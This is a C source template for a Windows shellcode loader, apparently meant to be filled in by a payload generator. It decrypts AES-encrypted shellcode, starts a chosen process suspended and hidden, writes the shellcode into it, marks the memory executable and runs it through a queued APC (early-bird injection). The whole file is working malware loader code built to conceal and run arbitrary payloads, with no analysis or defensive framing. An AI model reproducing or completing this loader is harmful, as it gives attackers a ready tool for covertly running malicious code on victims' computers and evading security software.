#include <windows.h>
#include <bcrypt.h>

unsigned char shellcode[] = { ${SHELLCODE} };
unsigned char key[]       = { ${KEY} };
unsigned char iv[]        = { ${IV} };

void AESDecrypt(unsigned char *data, DWORD data_len,
                unsigned char *key, unsigned char *iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG cbResult         = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);
    BCryptDecrypt(hKey, data, data_len, NULL, iv, 16,
                  data, data_len, &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

int main() {
    STARTUPINFO         StartupInfo       = { 0 };
    PROCESS_INFORMATION ProcessInfo       = { 0 };
    StartupInfo.cb = sizeof(StartupInfo);
    LPCSTR              lpApplicationName = "${TARGET_PROCESS}";
    LPVOID              lpAddress         = NULL;
    ULONG               lpflOldProtect    = 0;

    AESDecrypt(shellcode, sizeof(shellcode), key, iv);

    if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB,
                        NULL, NULL, &StartupInfo, &ProcessInfo)) {
        return 1;
    }

    lpAddress = VirtualAllocEx(ProcessInfo.hProcess, NULL,
                               sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    WriteProcessMemory(ProcessInfo.hProcess, lpAddress,
                       shellcode, sizeof(shellcode), NULL);

    VirtualProtectEx(ProcessInfo.hProcess, lpAddress,
                     sizeof(shellcode), PAGE_EXECUTE_READ, &lpflOldProtect);

    QueueUserAPC((PAPCFUNC)lpAddress, ProcessInfo.hThread, (ULONG_PTR)NULL);

    ResumeThread(ProcessInfo.hThread);

    return 0;
}
